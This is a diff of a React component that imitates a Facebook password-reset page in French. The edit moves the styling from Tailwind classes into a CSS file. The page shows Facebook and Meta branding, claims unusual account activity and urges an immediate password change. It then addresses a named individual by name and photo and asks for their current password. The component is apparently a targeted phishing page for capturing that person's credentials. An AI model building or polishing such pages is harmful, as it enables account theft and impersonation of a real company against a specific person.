@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import { Lock } from 'lucide-react';
 import profilePicture from '../assets/pfp.jpg'; // Update path as needed
+import './FacebookPasswordReset.css'; // Import the CSS file
 
 export default function FacebookPasswordReset() {
   const [page, setPage] = useState(1);
@@ -60,98 +61,97 @@ export default function FacebookPasswordReset() {
     }
   };
   
-
   return (
-    <div className="min-h-screen bg-gray-100 flex flex-col items-center">
+    <div className="container">
       {/* Facebook Header */}
-      <div className="w-full bg-white shadow-sm py-2 mb-4">
-        <div className="max-w-md mx-auto px-4">
-          <h1 className="text-blue-600 text-4xl font-bold">facebook</h1>
+      <div className="header">
+        <div className="header-content">
+          <h1 className="facebook-logo">facebook</h1>
         </div>
       </div>
 
       {/* Main Content */}
-      <div className="max-w-md w-full px-4">
-        <div className="bg-white rounded-lg shadow p-6 mb-4">
+      <div className="main-content">
+        <div className="content-card">
           {page === 1 ? (
-            <div className="flex flex-col items-center">
-              <div className="my-4 p-3 bg-blue-100 rounded-full">
-                <Lock className="h-12 w-12 text-blue-600" />
+            <div className="page-one">
+              <div className="lock-icon-container">
+                <Lock className="lock-icon" />
               </div>
               
-              <h2 className="text-xl font-semibold text-center mb-2">
+              <h2 className="title">
                 Changer votre mot de passe pour protéger votre compte
               </h2>
               
-              <p className="text-center text-gray-600 mb-6">
+              <p className="description">
                 Nous avons détecté une activité inhabituelle sur votre compte. Pour protéger votre compte, 
                 veuillez changer votre mot de passe immédiatement. Quelqu'un pourrait essayer d'accéder 
                 à votre compte.
               </p>
               
-              <p className="text-xs text-gray-500 mb-6">
+              <p className="terms">
                 En continuant, vous acceptez les Conditions générales et la Politique de confidentialité de Facebook.
               </p>
               
               <button 
                 onClick={handleContinue} 
-                className="w-full bg-blue-600 text-white py-2 px-4 rounded-md font-medium hover:bg-blue-700"
+                className="primary-button"
               >
                 Continuer
               </button>
             </div>
           ) : (
-            <div>
-              <div className="flex flex-col items-center mb-4">
-                <div className="w-24 h-24 rounded-full overflow-hidden">
+            <div className="page-two">
+              <div className="profile-section">
+                <div className="profile-picture-container">
                   <img 
                     src={profilePicture} 
                     alt="Nibras Farohe" 
-                    className="w-full h-full object-cover"
+                    className="profile-picture"
                   />
                 </div>
                 
-                <h2 className="text-xl font-medium mt-2">
+                <h2 className="profile-name">
                   Connexion en tant que Nibras Farohe
                 </h2>
                 
-                <p className="text-gray-500 text-sm">
-                  Nibras Farohe · <a href="#" className="text-blue-600">Pas vous?</a>
+                <p className="profile-link">
+                  Nibras Farohe · <a href="#" className="blue-link">Pas vous?</a>
                 </p>
               </div>
               
               {message && (
-                <div className="mb-4 p-2 bg-red-100 text-red-700 rounded">
+                <div className="error-message">
                   {message}
                 </div>
               )}
               
-              <div className="mt-4">
-                <div className="mb-4">
+              <div className="password-form">
+                <div className="form-group">
                   <input
                     type="password"
                     placeholder="Mot de passe actuel"
-                    className="w-full p-3 border border-gray-300 rounded-md"
+                    className="input-field"
                     value={oldPassword}
                     onChange={(e) => setOldPassword(e.target.value)}
                   />
                 </div>
                 
-                <div className="mb-4">
+                <div className="form-group">
                   <input
                     type="password"
                     placeholder="Nouveau mot de passe"
-                    className="w-full p-3 border border-gray-300 rounded-md"
+                    className="input-field"
                     value={newPassword}
                     onChange={(e) => setNewPassword(e.target.value)}
                   />
                 </div>
                 
-                <div className="mb-4">
+                <div className="form-group">
                   <input
                     type="password"
                     placeholder="Confirmer le nouveau mot de passe"
-                    className="w-full p-3 border border-gray-300 rounded-md"
+                    className="input-field"
                     value={confirmPassword}
                     onChange={(e) => setConfirmPassword(e.target.value)}
                   />
@@ -160,8 +160,7 @@ export default function FacebookPasswordReset() {
                 <button
                   onClick={handleSubmit}
                   disabled={isSubmitting}
-                  className={`w-full bg-blue-600 text-white py-3 px-4 rounded-md font-medium 
-                    ${isSubmitting ? 'opacity-70 cursor-not-allowed' : 'hover:bg-blue-700'}`}
+                  className={`primary-button ${isSubmitting ? 'button-disabled' : ''}`}
                 >
                   {isSubmitting ? 'Traitement en cours...' : 'Continuer'}
                 </button>
@@ -171,14 +170,14 @@ export default function FacebookPasswordReset() {
         </div>
         
         {/* Footer */}
-        <div className="text-center text-xs text-gray-500">
-          <div className="flex justify-center space-x-2 mb-2">
-            <a href="#" className="hover:underline">Français</a>
-            <a href="#" className="hover:underline">English (US)</a>
-            <a href="#" className="hover:underline">العربية</a>
-            <a href="#" className="hover:underline">Español</a>
+        <div className="footer">
+          <div className="language-options">
+            <a href="#" className="footer-link">Français</a>
+            <a href="#" className="footer-link">English (US)</a>
+            <a href="#" className="footer-link">العربية</a>
+            <a href="#" className="footer-link">Español</a>
           </div>
-          <p>Meta © 2025</p>
+          <p className="copyright">Meta © 2025</p>
         </div>
       </div>
     </div>
